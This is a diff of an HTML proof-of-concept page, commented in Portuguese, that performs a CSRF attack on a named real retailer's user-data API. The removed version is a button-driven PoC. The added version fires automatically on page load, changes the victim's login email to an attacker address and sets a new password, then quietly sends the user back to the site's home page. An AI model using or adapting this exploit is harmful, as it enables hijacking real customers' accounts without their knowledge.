@@ -1,36 +1,16 @@
-<!doctype html>
-<html lang="pt">
-<title>Expert.de – CSRF PoC</title>
-<meta charset="utf-8">
-<body style="font-family:sans-serif;text-align:center;margin-top:20vh">
-  <h2>Clique abaixo para alterar o e-mail da sua conta</h2>
-  <button onclick="poc()">Executar CSRF</button>
-  <pre id="log"></pre>
-
+<body>
 <script>
-function log(txt){document.getElementById('log').textContent+=txt+'\n';}
-
-function poc(){
-  log('Enviando...');
-  fetch('https://www.expert.de/api/neo/frontend/_api/user/changeBasicUserData',{
-    method:'POST',
-    credentials:'include',
-    headers:{
-      'Content-Type':'application/json',
-      'csrf-token':'722402ba-cab2-4fb4-bf4d-b79747753775'
-    },
-    body:JSON.stringify({
-      userData:{
-        firstname:'Ana',
-        lastname:'Silvana',
-        email:'csrf-poc@evil.example',
-        birthday:-86400000,
-        gender:'FEMALE'
-      }
-    })
+/* ainda dentro do domínio Expert graças ao redirect, cookie enviado automaticamente */
+fetch('/api/neo/frontend/_api/user/changeBasicUserData',{
+  method:'POST',
+  credentials:'include',
+  headers:{'Content-Type':'application/json'},
+  body:JSON.stringify({
+    userData:{
+      email:'pwned@evil.example',     // e-mail de login
+      password:'SenhaNova123'         // opcional, se houver endpoint separado
+    }
   })
-  .then(r=>{log('HTTP '+r.status); return r.text()})
-  .then(t=>log('Resposta: '+t))
-  .catch(e=>log('Erro: '+e));
-}
+}).then(()=>location='https://www.expert.de/')); // devolve o usuário à home
 </script>
+</body>
